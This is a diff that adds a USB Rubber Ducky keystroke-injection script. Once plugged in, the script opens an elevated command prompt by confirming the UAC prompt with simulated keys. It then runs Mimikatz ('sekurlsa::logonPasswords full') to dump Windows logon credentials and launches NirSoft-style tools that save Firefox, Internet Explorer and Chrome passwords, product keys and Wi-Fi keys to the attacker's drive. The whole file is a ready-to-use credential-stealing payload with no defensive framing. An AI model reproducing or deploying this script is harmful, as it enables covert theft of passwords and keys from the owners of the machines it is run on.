@@ -1,0 +1,60 @@
+DELAY 1000
+WINDOWS D
+DELAY 250
+WINDOWS r
+DELAY 250
+STRING powershell Start-Process cmd.exe -Verb runAs
+ENTER
+DELAY 1500
+ALT y
+DELAY 250
+ 
+BACKSPACE
+ 
+STRING for /f %d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set duck=%d
+ENTER
+DELAY 500
+STRING mkdir %duck%\Passwords\%COMPUTERNAME%\
+ENTER
+ 
+STRING %duck%\Files\Mimikatz32.exe > %duck%\Passwords\%COMPUTERNAME%\WindowsLogIn.txt
+ENTER
+DELAY 500
+STRING privilege::debug
+ENTER
+DELAY  500
+STRING sekurlsa::logonPasswords full
+ENTER
+STRING exit
+ENTER
+ 
+STRING for /f "tokens=3 delims= " %A in ('echo list volume ^| diskpart ^| findstr "DUCKY"') do (set DUCKYdrive=%A:)
+DELAY 500
+ENTER
+ 
+STRING set DUCKYdrive=%DUCKYdrive%
+DELAY 500
+ENTER
+ 
+STRING mkdir %DUCKYDRIVE%\Passwords\%COMPUTERNAME%\
+DELAY 500
+ENTER
+ 
+STRING start %DUCKYdrive%\Files\FoxPass.exe /stext %DUCKYdrive%\Passwords\%computername%\FireFoxPasses.txt
+DELAY 500
+ENTER
+STRING start %DUCKYdrive%\Files\IEpass.exe /stext %DUCKYdrive%\Passwords\%computername%\InternetExplorerPasses.txt
+DELAY 500
+ENTER
+STRING start %DUCKYdrive%\Files\ChromePass.exe /stext %DUCKYdrive%\Passwords\%computername%\ChromePasses.txt 
+DELAY 500
+ENTER
+STRING start %DUCKYdrive%\Files\ProductKey.exe /stext %DUCKYdrive%\Passwords\%computername%\ProductKeys.txt 
+DELAY 500
+ENTER
+STRING start %DUCKYdrive%\Files\WirelessKeyView.exe /stext %DUCKYdrive%\Passwords\%computername%\WirelessKeyView.txt 
+DELAY 500
+ENTER
+STRING exit
+DELAY 500
+ENTER
